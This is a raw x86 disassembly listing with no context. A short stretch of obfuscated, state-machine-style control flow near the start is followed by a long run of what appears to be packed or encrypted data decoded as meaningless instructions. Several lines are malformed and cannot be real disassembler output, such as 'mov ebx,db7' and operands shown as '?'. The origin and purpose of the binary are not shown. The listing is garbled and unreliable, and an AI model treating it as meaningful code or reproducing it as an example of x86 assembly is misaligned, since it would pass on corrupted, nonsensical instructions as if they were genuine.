  40f16f:	push   DWORD PTR [eax]
  40f171:	call   0x40c099
  40f176:	jmp    0x40f1ad
  40f17b:	cmp    edi,0x13d
  40f181:	jne    0x40f1ad
  40f187:	mov    eax,DWORD PTR [ebp-0x10]
  40f18a:	xor    eax,esi
  40f18c:	add    eax,ebx
  40f18e:	mov    DWORD PTR [ebp+0x8],eax
  40f191:	mov    eax,ds:0x413bde
  40f196:	mov    DWORD PTR [ebp+0x8],eax
  40f199:	mov    eax,DWORD PTR [ebp-0x14]
  40f19c:	mov    DWORD PTR [ebp-0x4],eax
  40f19f:	mov    eax,DWORD PTR [ebp-0x4]
  40f1a2:	push   0x4
  40f1a4:	pop    ecx
  40f1a5:	sub    ecx,eax
  40f1a7:	add    ecx,DWORD PTR [ebp-0x18]
  40f1aa:	mov    DWORD PTR [ebp-0x8],ecx
  40f1ad:	mov    eax,DWORD PTR [ebp+0xc]
  40f1b0:	xor    eax,esi
  40f1b2:	lea    edi,[edi+eax*1+0x32729b]
  40f1b9:	cmp    edi,0x50b
  40f1bf:	jne    0x40ea09
  40f1c5:	mov    eax,DWORD PTR [ebp+0xc]
  40f1c8:	pop    edi
  40f1c9:	xor    eax,esi
  40f1cb:	jmp    0x40f3f8
  40f1d0:	push   edx
  40f1d1:	mov    ecx,0x7215e615
  40f1d6:	jno    0x40f241
  40f1d8:	scas   al,BYTE PTR es:[edi]
  40f1d9:	out    dx,al
  40f1da:	lds    esp,FWORD PTR [edx+0x43837b9]
  40f1e0:	lahf   
  40f1e1:	lods   eax,DWORD PTR ds:[esi]
  40f1e2:	jle    0x40f262
  40f1e4:	push   cs
  40f1e5:	jl     0x40f265
  40f1e7:	jle    0x40f1b3
  40f1e9:	and    al,0x5b
  40f1eb:	mov    BYTE PTR [edi],ch
  40f1ed:	enter  0x7455,0xdf
  40f1f1:	hlt    
  40f1f2:	dec    edx
  40f1f3:	test   DWORD PTR [ebx+0x4d],0xea1b6f12
  40f1fa:	aas    
  40f1fb:	mov    ds:0xfaa13b8a,al
  40f200:	push   esi
  40f201:	mov    ch,0x39
  40f203:	rol    BYTE PTR [ebp-0xd],cl
  40f206:	mov    cl,0xce
  40f208:	rol    BYTE PTR [edx],cl
  40f20a:	and    al,0x3b
  40f20c:	(bad)  
  40f20d:	push   ecx
  40f20e:	cmp    esi,edi
  40f210:	mul    BYTE PTR [edx-0x2b]
  40f213:	stos   BYTE PTR es:[edi],al
  40f214:	jae    0x40f1fa
  40f216:	fistp  DWORD PTR [eax-0x12c5a748]
  40f21c:	std    
  40f21d:	add    ecx,0xffffffa3
  40f220:	xor    BYTE PTR [ecx-0x28],al
  40f223:	cdq    
  40f224:	xor    ch,dl
  40f226:	fsubr  QWORD PTR [ebx]
  40f228:	or     BYTE PTR [ebx+0x1],dh
  40f22b:	sahf   
  40f22c:	mov    ecx,DWORD PTR [eax-0x4b5b377b]
  40f232:	dec    esp
  40f233:	repnz retf 0x2b4d
  40f237:	(bad)  [edi-0x22017f3f]
  40f23d:	hlt    
  40f23e:	jae    0x40f260
  40f240:	cmp    DWORD PTR [edi],edi
  40f242:	fdivr  QWORD PTR [esi+0x52]
  40f245:	int3   
  40f246:	dec    ebx
  40f247:	pop    ebx
  40f248:	bound  ecx,QWORD PTR [eax+0x4f845191]
  40f24e:	add    eax,DWORD PTR [edi+0x4a]
  40f251:	imul   edx,DWORD PTR [ecx],0x33
  40f254:	jo     0x40f2a9
  40f256:	xor    eax,0x93c93031
  40f25b:	sub    eax,0x6878b209
  40f260:	push   ebx
  40f261:	add    ecx,DWORD PTR [ecx]
  40f263:	or     ch,BYTE PTR [esi+0x197b2c58]
  40f269:	sahf   
  40f26a:	int3   
  40f26b:	jmp    0xe5632365
  40f270:	jne    0x40f2ab
  40f272:	jbe    0x40f2a4
  40f274:	or     al,0xd1
  40f276:	mov    ebp,0xa4718404
  40f27b:	push   esi
  40f27c:	mov    edi,0x27a32994
  40f281:	or     al,0x22
  40f283:	scas   al,BYTE PTR es:[edi]
  40f284:	div    BYTE PTR [eax]
  40f286:	popa   
  40f287:	mov    ebx,0xcfc1de28
  40f28c:	pop    ecx
  40f28d:	add    eax,0x746a5c0b
  40f292:	pop    ecx
  40f293:	sub    esi,esp
  40f295:	bound  ebp,QWORD PTR [ebp+esi*8-0x44768a94]
  40f29c:	daa    
  40f29d:	cli    
  40f29e:	dec    eax
  40f29f:	ret    
  40f2a0:	lods   al,BYTE PTR ds:[esi]
  40f2a1:	or     ebx,DWORD PTR [ebp+0x5c]
  40f2a4:	loop   0x40f266
  40f2a6:	nop
  40f2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a8:	push   esi
  40f2a9:	jae    0x40f328
  40f2ab:	sar    bh,1
  40f2ad:	jmp    0x8dce:0xd045263a
  40f2b4:	out    0x48,al
  40f2b6:	neg    edi
  40f2b8:	loope  0x40f2cb
  40f2ba:	xchg   esi,eax
  40f2bb:	in     al,dx
  40f2bc:	aaa    
  40f2bd:	iret   
  40f2be:	jle    0x40f2df
  40f2c0:	sub    dh,bh
  40f2c2:	pop    es
  40f2c3:	xor    eax,0x29d3bc91
  40f2c8:	jl     0x40f297
  40f2ca:	mov    ebx,0x2afb5b0c
  40f2cf:	cmp    BYTE PTR [ebx],bl
  40f2d1:	push   es
  40f2d2:	inc    edi
  40f2d3:	mov    ds:0xed8340e4,eax
  40f2d8:	push   0x9c401ea0
  40f2dd:	xor    BYTE PTR [edi],ch
  40f2df:	pop    edi
  40f2e0:	cdq    
  40f2e1:	jae    0x40f32b
  40f2e3:	mov    ebp,0x558675eb
  40f2e8:	aad    0x1b
  40f2ea:	fcomp  DWORD PTR [esi+0x51]
  40f2ed:	xchg   BYTE PTR [ecx],al
  40f2ef:	shl    DWORD PTR [ebx-0x36],cl
  40f2f2:	sub    BYTE PTR [ecx+eiz*8-0x3a],cl
  40f2f6:	cdq    
  40f2f7:	add    DWORD PTR ds:0xe0c0251d,edx
  40f2fd:	jns    0x40f356
  40f2ff:	hlt    
  40f300:	cmp    ah,BYTE PTR ds:[ebp+0x3]
  40f304:	mov    dh,0x8
  40f306:	sbb    al,0x9f
  40f309:	sub    BYTE PTR [eax],bh
  40f30b:	add    al,BYTE PTR [edx-0x27a94ab9]
  40f311:	inc    ecx
  40f312:	pop    ecx
  40f313:	mov    DWORD PTR [ecx+0x5252638f],esi
  40f319:	push   ecx
  40f31a:	dec    ebx
  40f31b:	jmp    0x7b84:0x59ce4ecc
  40f322:	aas    
  40f323:	sbb    ah,BYTE PTR [ebx+edi*2]
  40f326:	pop    esp
  40f327:	bound  esi,QWORD PTR [edx-0xf]
  40f32a:	into   
  40f32b:	ds mov bl,0xcc
  40f32e:	xchg   ebx,eax
  40f32f:	xchg   ebx,eax
  40f330:	push   ecx
  40f331:	cmp    DWORD PTR [eax+ebp*8-0x6],esi
  40f335:	mov    BYTE PTR [ebx-0x6c7877af],ah
  40f33b:	pop    ebp
  40f33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f33d:	outs   dx,DWORD PTR ds:[esi]
  40f33e:	fist   WORD PTR [ebp+ebx*1-0x719c1b91]
  40f345:	jne    0x40f34e
  40f347:	mov    eax,0x70f2a8fc
  40f34c:	ja     0x40f361
  40f34e:	and    DWORD PTR [esi],ecx
  40f350:	xchg   ebp,eax
  40f351:	pop    ebx
  40f352:	lds    ecx,FWORD PTR [esi]
  40f354:	xchg   edx,eax
  40f355:	sbb    BYTE PTR [ebp+esi*8+0x7c],cl
  40f359:	xor    BYTE PTR ds:0xc87575e5,al
  40f35f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f360:	sar    BYTE PTR ds:0x91a33fb9,0xa3
  40f367:	addr16 leave 
  40f369:	xor    DWORD PTR [esi+eax*4-0x12],eax
  40f36d:	test   eax,0xa6459742
  40f372:	push   0x37
  40f374:	pop    ebp
  40f375:	xor    DWORD PTR [esi],ebx
  40f377:	dec    edi
  40f378:	fnstcw WORD PTR ss:[ecx-0x34]
  40f37c:	test   al,0x8e
  40f37e:	sub    al,0xa9
  40f380:	adc    eax,0x92e157ce
  40f385:	adc    DWORD PTR [eax],eax
  40f387:	imul   edx,DWORD PTR [edi],0xdec20f4e
  40f38d:	pop    esi
  40f38e:	dec    esp
  40f38f:	xchg   esp,esp
  40f391:	or     dl,BYTE PTR [edi+0x3c14aa09]
  40f397:	mov    ebx,0x2f4939d1
  40f39c:	outs   dx,BYTE PTR ds:[esi]
  40f39d:	rcl    BYTE PTR [edi],cl
  40f39f:	add    BYTE PTR [edx+eax*4-0x2bd8f005],dl
  40f3a6:	xor    eax,0x2df8f90e
  40f3ab:	mov    bl,al
  40f3ad:	add    al,0x8d
  40f3af:	pusha  
  40f3b0:	mov    BYTE PTR [ebp-0x66a87f84],bh
  40f3b6:	pop    eax
  40f3b7:	push   edi
  40f3b8:	pop    edx
  40f3b9:	mov    eax,ds:0x6e9b5fca
  40f3be:	jmp    0x40f40f
  40f3c0:	dec    ebp
  40f3c1:	mov    ds:0x125030ea,eax
  40f3c6:	add    DWORD PTR [edi-0x28e2f055],esp
  40f3cc:	jbe    0x40f3bf
  40f3ce:	push   es
  40f3cf:	push   ebx
  40f3d0:	adc    ebp,esp
  40f3d2:	mov    ds:0xe2d23c8f,eax
  40f3d7:	push   esi
  40f3d8:	cld    
  40f3d9:	and    al,0xd0
  40f3db:	test   al,0x52
  40f3dd:	mov    al,0x8e
  40f3df:	cmp    DWORD PTR [ecx-0x6d],edi
  40f3e2:	(bad)  
  40f3e4:	xor    bl,bl
  40f3e6:	xchg   edi,eax
  40f3e7:	mov    edx,DWORD PTR [edx+0x381ffab6]
  40f3ed:	scas   eax,DWORD PTR es:[edi]
  40f3ee:	or     eax,0x2eb0efd3
  40f3f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3f4:	retf   
  40f3f5:	or     edi,ebp
  40f3f7:	xchg   edx,eax
  40f3f8:	pop    esi
  40f3f9:	add    eax,ebx
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433827,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	(bad)  
  40f42a:	cwde   
  40f42b:	and    dl,BYTE PTR [edx+0x7e7eabaf]
  40f431:	lods   al,BYTE PTR ds:[esi]
  40f432:	jl     0x40f4b2
  40f434:	jle    0x40f460
  40f436:	lods   eax,DWORD PTR ds:[esi]
  40f437:	push   ebx
  40f438:	mov    ds:0xfecc7790,eax
  40f43d:	mov    ebp,0x18ca6db6
  40f442:	pop    ebx
  40f443:	loopne 0x40f45a
  40f445:	retf   
  40f446:	out    dx,eax
  40f447:	jo     0x40f4a3
  40f449:	add    al,0x43
  40f44b:	pusha  
  40f44c:	jne    0x40f3f5
  40f44e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44f:	push   ebx
  40f450:	outs   dx,DWORD PTR ds:[esi]
  40f451:	aaa    
  40f452:	jmp    0xbc14e661
  40f457:	enter  0x37e0,0xf0
  40f45b:	jo     0x40f460
  40f45d:	jle    0x40f4ce
  40f45f:	test   BYTE PTR [esi+eiz*1],bh
  40f462:	inc    ebp
  40f464:	mov    ebx,0xde589b16
  40f469:	repz mov bl,0x5f
  40f46c:	mov    ebx,DWORD PTR [ebp-0x24a3ec06]
  40f472:	mov    BYTE PTR [ebx],cl
  40f474:	das    
  40f475:	mov    cl,0xa8
  40f477:	out    dx,al
  40f478:	xchg   DWORD PTR [edx-0x31365a08],ebp
  40f47e:	mov    esp,DWORD PTR [ebp+0x46]
  40f481:	ins    DWORD PTR es:[edi],dx
  40f482:	or     edx,DWORD PTR [esi-0x562022f1]
  40f488:	imul   edi,esi,0x1a739ef8
  40f48e:	daa    
  40f48f:	pushw  0x73
  40f492:	jmp    0xc90304dc
  40f497:	push   cs
  40f498:	xor    esp,DWORD PTR [edx+0x11c010f9]
  40f49e:	adc    DWORD PTR [eax+ebp*4-0x53],esp
  40f4a2:	out    0x25,eax
  40f4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4a5:	push   cs
  40f4a6:	test   DWORD PTR [ebp-0x4c],esi
  40f4a9:	fild   WORD PTR [edx+0x48]
  40f4ac:	dec    ecx
  40f4ad:	rol    BYTE PTR [ebx],0x27
  40f4b0:	and    BYTE PTR [edx+eax*8-0x45bee346],0x38
  40f4b8:	ins    DWORD PTR es:[edi],dx
  40f4b9:	lock dec edx
  40f4bb:	pop    esi
  40f4bc:	and    DWORD PTR [ecx],0xffffffab
  40f4bf:	push   esp
  40f4c0:	mov    al,ds:0x9286704e
  40f4c5:	fs nop
  40f4c7:	pop    ecx
  40f4c8:	loopne 0x40f4ca
  40f4ca:	jge    0x40f51e
  40f4cc:	sti    
  40f4cd:	stc    
  40f4ce:	pop    ebx
  40f4cf:	pop    ds
  40f4d0:	xchg   edi,eax
  40f4d1:	test   DWORD PTR [ecx+0x6e7c9d9e],ecx
  40f4d7:	cli    
  40f4d8:	out    dx,al
  40f4d9:	ins    DWORD PTR es:[edi],dx
  40f4da:	add    eax,0x366e96d5
  40f4df:	lahf   
  40f4e0:	fdiv   DWORD PTR [ecx-0x4d6ed303]
  40f4e6:	pop    es
  40f4e7:	test   eax,0xa13c9410
  40f4ec:	xchg   ah,dh
  40f4ee:	push   esp
  40f4ef:	and    dl,BYTE PTR [ebx-0x6b]
  40f4f2:	cmp    eax,0xa4c942c8
  40f4f7:	dec    ebx
  40f4f8:	push   DWORD PTR [eax+ebx*4-0x57b09660]
  40f4ff:	sbb    al,0xf5
  40f501:	out    dx,al
  40f502:	scas   eax,DWORD PTR es:[edi]
  40f503:	cld    
  40f504:	sub    esp,DWORD PTR [edx+0x6af7e393]
  40f50a:	arpl   WORD PTR [esi+0x467f351],sp
  40f510:	dec    eax
  40f511:	xchg   edx,eax
  40f512:	sbb    DWORD PTR [ecx+0x56],edx
  40f515:	jo     0x40f4c8
  40f517:	out    dx,al
  40f518:	push   es
  40f519:	je     0x40f543
  40f51b:	mov    bh,0x4f
  40f51d:	push   edi
  40f51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f51f:	add    BYTE PTR [eax+0x7],al
  40f522:	gs call 0x5a7e1507
  40f528:	xchg   ecx,eax
  40f529:	inc    ebp
  40f52a:	xchg   ebp,eax
  40f52b:	push   ecx
  40f52c:	mov    eax,0xa967a268
  40f531:	mov    ebx,db7
  40f534:	xor    BYTE PTR [ebp+0x2f94a3c2],bl
  40f53a:	addr16 jae 0x40f58f
  40f53d:	ret    
  40f53e:	mov    al,BYTE PTR [ebp+edi*2+0x3d]
  40f542:	adc    ecx,DWORD PTR [edi]
  40f544:	xchg   BYTE PTR [ebx+eax*1-0x39],ch
  40f548:	inc    ecx
  40f549:	test   eax,0x3a7928db
  40f54e:	adc    al,0x8c
  40f550:	add    cl,bl
  40f552:	lahf   
  40f553:	adc    edx,DWORD PTR [edi+0x51]
  40f556:	ja     0x40f54b
  40f558:	(bad)  
  40f55a:	mov    ah,0x6d
  40f55c:	je     0x40f546
  40f55e:	in     al,0x28
  40f560:	ficomp DWORD PTR [edx-0x36a9d206]
  40f566:	ror    BYTE PTR [esi],1
  40f568:	xor    BYTE PTR [edi-0x22],0xe3
  40f56c:	fs xor al,0xa9
  40f56f:	stos   BYTE PTR es:[edi],al
  40f570:	lahf   
  40f571:	fstp   TBYTE PTR [edi]
  40f573:	dec    eax
  40f574:	stos   DWORD PTR es:[edi],eax
  40f575:	(bad)  [edx]
  40f577:	je     0x40f512
  40f579:	mov    bh,0xfd
  40f57b:	sub    BYTE PTR [edi-0x24],bl
  40f57e:	repz mov gs,WORD PTR [esi]
  40f581:	iret   
  40f582:	jmp    0x99b2:0xd63e379e
  40f589:	imul   eax,DWORD PTR [ecx],0xe91349c
  40f58f:	and    al,0x67
  40f591:	adc    ebx,DWORD PTR [eax]
  40f593:	test   al,0x8c
  40f595:	test   BYTE PTR [edx+ebx*4-0x6fd24f93],dh
  40f59c:	xor    BYTE PTR [eax-0x71],cl
  40f59f:	or     eax,0x518bb505
  40f5a4:	fmul   DWORD PTR [esi]
  40f5a6:	jge    0x40f557
  40f5a8:	pop    ds
  40f5a9:	lahf   
  40f5aa:	jle    0x40f57c
  40f5ac:	push   edx
  40f5ad:	dec    esp
  40f5ae:	xchg   ebx,eax
  40f5af:	and    eax,0xccecf8de
  40f5b4:	jg     0x40f5df
  40f5b6:	les    edx,FWORD PTR [ebx-0x4]
  40f5b9:	mov    DWORD PTR [esi+0x6a],0x859a70aa
  40f5c0:	jne    0x40f615
  40f5c2:	ror    BYTE PTR [edi],0xae
  40f5c5:	inc    esi
  40f5c6:	xchg   ebx,eax
  40f5c7:	repnz push ebx
  40f5c9:	jmp    0x8146726a
  40f5ce:	mov    cl,0xcd
  40f5d0:	sub    al,0xd
  40f5d2:	mov    WORD PTR [eax-0x6163e22a],?
  40f5d8:	jmp    0x40f613
  40f5da:	(bad)
  40f5de:	test   eax,0xfe19046
  40f5e3:	sbb    eax,0xd5000c63
  40f5e8:	sahf   
  40f5e9:	jl     0x40f669
  40f5eb:	rcl    DWORD PTR ds:0x3b20931d,1
  40f5f1:	and    al,0x70
  40f5f3:	out    dx,eax
  40f5f4:	mov    eax,0x105884d9
  40f5f9:	dec    esp
  40f5fa:	add    eax,0x5cbe9109
  40f5ff:	cdq    
  40f600:	fs push cs
  40f602:	in     eax,0xc5
  40f604:	pusha  
  40f605:	ss sub al,0x6
  40f608:	bound  ebp,QWORD PTR [esi+ecx*4-0x61]
  40f60c:	cli    
  40f60d:	and    eax,0xcb14551c
  40f612:	lock pop esi
  40f614:	jmp    0x40f601
  40f616:	push   edi
  40f617:	(bad)  
  40f619:	pop    ecx
  40f61a:	jbe    0x40f68e
  40f61c:	test   DWORD PTR [ebp-0x14],ebp
  40f61f:	lods   al,BYTE PTR ds:[esi]
  40f620:	mov    ecx,0x31e9606c
  40f625:	sub    edi,DWORD PTR [edi-0x7c]
  40f628:	dec    esi
  40f629:	test   ecx,ebp
  40f62b:	or     eax,0x6f4b4f5e
  40f630:	cmc    
  40f631:	fld    TBYTE PTR [eax+0x14]
  40f634:	sub    DWORD PTR [edx],esi
  40f636:	xchg   ecx,eax
  40f637:	jb     0x40f648
  40f639:	ret    
  40f63a:	push   0xd2659109
  40f63f:	popf   
  40f640:	jnp    0x40f6a9
  40f642:	pop    esp
  40f643:	mov    ?,WORD PTR [esi-0x37e2a385]
  40f649:	push   esp
  40f64a:	aaa    
  40f64b:	out    dx,eax
  40f64c:	out    dx,eax
  40f64d:	xchg   ecx,eax
  40f64e:	cld    
  40f64f:	fld    DWORD PTR [eax-0x71d929f2]
  40f655:	data16 cmp BYTE PTR [ebx+0x5fa3291f],bh
  40f65c:	pop    esp
  40f65d:	ds (bad) 
  40f65f:	push   0x9c5f2dff
  40f664:	ja     0x40f6ce
  40f666:	sahf   
  40f667:	nop
  40f668:	lods   al,BYTE PTR ds:[esi]
  40f669:	inc    ebx
  40f66a:	xchg   edx,eax
  40f66b:	pop    ebx
  40f66c:	ss push eax
  40f66e:	cmp    bl,cl
  40f670:	sbb    dh,dh
  40f672:	loope  0x40f647
  40f674:	push   0x65f8661
  40f679:	sbb    edi,DWORD PTR [ebp-0x40]
  40f67c:	dec    ecx
  40f67d:	dec    eax
  40f67e:	sub    eax,0xf5afdb70
  40f683:	push   ecx
  40f684:	adc    al,0xc2
  40f686:	mov    eax,0x3769052f
  40f68b:	clc    
  40f68c:	xchg   DWORD PTR [esi],ebp
  40f68e:	je     0x40f676
  40f690:	jle    0x40f617
  40f692:	push   edi
  40f693:	mov    edi,0xf6b33f9
  40f698:	popa   
  40f699:	inc    edi
  40f69a:	imul   edi,DWORD PTR [edi-0x12e09c10],0x4a4ceeb9
  40f6a4:	sbb    eax,0x8376145
  40f6a9:	pop    ds
  40f6aa:	xchg   edx,eax
  40f6ab:	sub    esp,edx
  40f6ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6ae:	inc    esp
  40f6af:	hlt    
  40f6b0:	daa    
  40f6b1:	nop
  40f6b2:	mov    dl,0xed
  40f6b4:	fisttp WORD PTR [ebx]
  40f6b6:	stc    
  40f6b7:	loopne 0x40f6e2
  40f6b9:	loop   0x40f68b
  40f6bb:	out    0x58,al
  40f6bd:	dec    ebp
  40f6be:	cdq    
  40f6bf:	pop    ebx
  40f6c0:	js     0x40f678
  40f6c2:	pop    esi
  40f6c3:	dec    edi
  40f6c4:	arpl   sp,si
  40f6c6:	in     al,0xd9
  40f6c8:	adc    al,BYTE PTR ds:0xa711ea25
  40f6ce:	aaa    
  40f6cf:	mul    DWORD PTR [edi]
  40f6d1:	(bad)  
  40f6d3:	(bad)  
  40f6d4:	mov    gs,WORD PTR [edx]
  40f6d6:	xchg   ebp,eax
  40f6d7:	inc    eax
  40f6d8:	mov    ds,eax
  40f6da:	inc    edi
  40f6db:	cmp    DWORD PTR [edx+0x36],edx
  40f6de:	add    al,0x8f
  40f6e0:	outs   dx,BYTE PTR ds:[esi]
  40f6e1:	xchg   ecx,eax
  40f6e2:	call   0x45c7:0xf6da993e
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	cmp    BYTE PTR [ebx+0x0],al
  40f6f4:	jb     0x40f752
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4337e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	xor    bl,al
  40f718:	ret    0xdd67
  40f71b:	mov    dh,0x7e
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f76f
  40f723:	add    DWORD PTR [edi-0x340aaea9],edi
  40f729:	clc    
  40f72a:	pop    ecx
  40f72b:	xchg   edi,eax
  40f72c:	and    DWORD PTR [edx],0xafe1edb0
  40f732:	mov    esp,0xa58d4d98
  40f737:	jge    0x40f797
  40f739:	dec    esp
  40f73a:	cdq    
  40f73b:	iret   
  40f73c:	sub    bl,dl
  40f73e:	test   DWORD PTR ds:0xf3299bf6,0x10cd0a6
  40f748:	sbb    DWORD PTR [ebp+eax*4+0x492b5b69],esp
  40f74f:	lods   al,BYTE PTR ds:[esi]
  40f750:	ja     0x40f76a
  40f752:	out    0x30,eax
  40f754:	in     al,dx
  40f755:	push   edx
  40f756:	push   eax
  40f757:	xor    esi,DWORD PTR [ebp+ebx*8-0x51793f4]
  40f75e:	pop    ecx
  40f75f:	cs sub eax,0x1f37a3
  40f765:	or     BYTE PTR [ebp-0x54551532],0xc1
  40f76c:	call   0x70b1:0xb7ed8be
  40f773:	adc    al,BYTE PTR [eax-0x5a]
  40f776:	addr16 dec edi
  40f778:	inc    edi
  40f779:	(bad)  
  40f77a:	adc    al,0xb5
  40f77c:	adc    bl,0xef
  40f77f:	mov    dl,0xca
  40f781:	inc    ebp
  40f782:	or     eax,0xd5b72130
  40f787:	dec    esp
  40f788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f789:	lods   eax,DWORD PTR ds:[esi]
  40f78a:	scas   eax,DWORD PTR es:[edi]
  40f78b:	sar    BYTE PTR [ebx+0x299a8114],cl
  40f791:	jge    0x40f7bc
  40f793:	ds mov dl,0x1c
  40f796:	cmp    DWORD PTR [ecx+0x61],ebp
  40f799:	dec    edx
  40f79a:	fld1   
  40f79c:	popa   
  40f79d:	test   esi,eax
  40f79f:	mov    DWORD PTR [edx-0x11],eax
  40f7a2:	neg    DWORD PTR [edi-0x47]
  40f7a5:	into   
  40f7a6:	add    ebp,DWORD PTR [edx-0x2d]
  40f7a9:	mov    ebx,0xfe674f1e
  40f7ae:	add    BYTE PTR [edx+0x32d271ae],0x1e
  40f7b5:	sub    bl,BYTE PTR [ebp-0x63de4d7b]
  40f7bb:	xor    BYTE PTR [ebp+0x2eb969fd],bl
  40f7c1:	jg     0x40f7c2
  40f7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7c4:	outs   dx,DWORD PTR ds:[esi]
  40f7c5:	push   0x67
  40f7c7:	sbb    DWORD PTR [ebx+ecx*4],ebp
  40f7ca:	arpl   WORD PTR [esi+0x78be6f59],bp
  40f7d0:	push   ebp
  40f7d1:	mov    ah,0xb3
  40f7d3:	sub    esp,edx
  40f7d5:	arpl   WORD PTR [ecx+0x62],di
  40f7d8:	(bad)  
  40f7d9:	loop   0x40f811
  40f7db:	push   0xffffffd9
  40f7dd:	repz fiadd WORD PTR [ecx-0x1be2b662]
  40f7e4:	push   edx
  40f7e5:	add    dl,BYTE PTR [eax]
  40f7e7:	mov    esp,0x6874b18f
  40f7ec:	sahf   
  40f7ed:	popf   
  40f7ee:	xchg   esp,eax
  40f7ef:	gs loopne 0x40f7c1
  40f7f2:	mov    esi,DWORD PTR [ecx-0x6b]
  40f7f5:	mov    edi,0xc5eb5725
  40f7fa:	dec    ecx
  40f7fb:	add    DWORD PTR [edi],ebx
  40f7fd:	popf   
  40f7fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7ff:	jge    0x40f813
  40f801:	jmp    0x3b4ddc94
  40f806:	cld    
  40f807:	and    BYTE PTR [esi+0x5b],bh
  40f80a:	xchg   edx,eax
  40f80b:	ret    0x2256
  40f80e:	test   al,0x17
  40f810:	jbe    0x40f7af
  40f812:	mov    al,ds:0x25fe0793
  40f817:	retf   0x7f6e
  40f81a:	lock pop ebp
  40f81c:	jp     0x40f888
  40f81e:	out    dx,eax
  40f81f:	in     al,0x15
  40f821:	sar    DWORD PTR [ebp-0x13765c4d],1
  40f827:	in     eax,dx
  40f828:	adc    esp,DWORD PTR [eax]
  40f82a:	retf   0x8bdf
  40f82d:	(bad)  
  40f82e:	cwde   
  40f82f:	into   
  40f830:	push   edx
  40f831:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f832:	mov    dh,BYTE PTR [ebx-0x1b6b1f87]
  40f838:	imul   ebp,DWORD PTR [eax],0xffffffa9
  40f83b:	pop    ebp
  40f83c:	jb     0x40f855
  40f83e:	fimul  DWORD PTR [ecx+0x7142cf93]
  40f844:	pushf  
  40f845:	mov    cl,0x43
  40f848:	cmp    esi,DWORD PTR [edi]
  40f84a:	popa   
  40f84b:	(bad)  
  40f84c:	aas    
  40f84d:	adc    al,BYTE PTR [esi+0x606d67d4]
  40f853:	les    ecx,FWORD PTR [ebx-0x3f]
  40f856:	pusha  
  40f857:	call   0xc75519f1
  40f85c:	sbb    al,0x57
  40f85e:	cmc    
  40f85f:	mov    ah,0x42
  40f861:	aam    0x3
  40f863:	cmp    ch,ah
  40f865:	mov    ds:0xa65b9d6,al
  40f86a:	inc    eax
  40f86b:	dec    edx
  40f86c:	jbe    0x40f837
  40f86e:	mov    DWORD PTR [ecx-0x60bc4c4f],ecx
  40f874:	add    DWORD PTR [esi],esp
  40f876:	out    dx,eax
  40f877:	pop    esi
  40f878:	push   es
  40f879:	and    ecx,eax
  40f87b:	ficom  WORD PTR [edx-0x5911620]
  40f881:	pusha  
  40f882:	mov    al,ds:0x1306ecf5
  40f887:	pop    ebp
  40f888:	arpl   WORD PTR [edi+edx*8-0x3a84fcce],si
  40f88f:	(bad)  
  40f890:	adc    cl,BYTE PTR [eax-0x3c]
  40f893:	cmp    cl,bh
  40f895:	jno    0x40f8b5
  40f897:	call   0x82cad410
  40f89c:	fs pushf 
  40f89e:	icebp  
  40f89f:	fisttp DWORD PTR [edi+edx*8+0x1ee51842]
  40f8a6:	stos   DWORD PTR es:[edi],eax
  40f8a7:	int3   
  40f8a8:	clc    
  40f8a9:	jge    0x40f90c
  40f8ab:	mov    ecx,0x57ec1e2c
  40f8b0:	pop    ds
  40f8b1:	adc    eax,0xf262df7a
  40f8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8b7:	rcl    DWORD PTR ds:0xc66555bc,cl
  40f8bd:	iret   
  40f8be:	daa    
  40f8bf:	xchg   edi,eax
  40f8c0:	or     eax,ebx
  40f8c2:	(bad)  
  40f8c3:	adc    esi,DWORD PTR [eax+0x66ee5e64]
  40f8c9:	push   0xffffff8c
  40f8cb:	ror    DWORD PTR [esi-0x77],cl
  40f8ce:	xchg   ah,ah
  40f8d0:	xchg   ecx,eax
  40f8d1:	cld    
  40f8d2:	icebp  
  40f8d3:	fisub  WORD PTR [edi+ecx*1-0x7496f05b]
  40f8da:	into   
  40f8db:	push   0xffffffc6
  40f8dd:	lds    esp,FWORD PTR [edx-0xd2a5c6a]
  40f8e3:	add    eax,ebp
  40f8e5:	jno    0x40f869
  40f8e7:	clc    
  40f8e8:	push   cs
  40f8e9:	in     eax,dx
  40f8ea:	gs pusha 
  40f8ec:	add    ah,BYTE PTR [eax-0x5a]
  40f8ef:	adc    bh,bl
  40f8f1:	cs jp  0x40f8d1
  40f8f4:	adc    dl,BYTE PTR [esp+edx*2]
  40f8f7:	lea    ebx,[edi+0x1c]
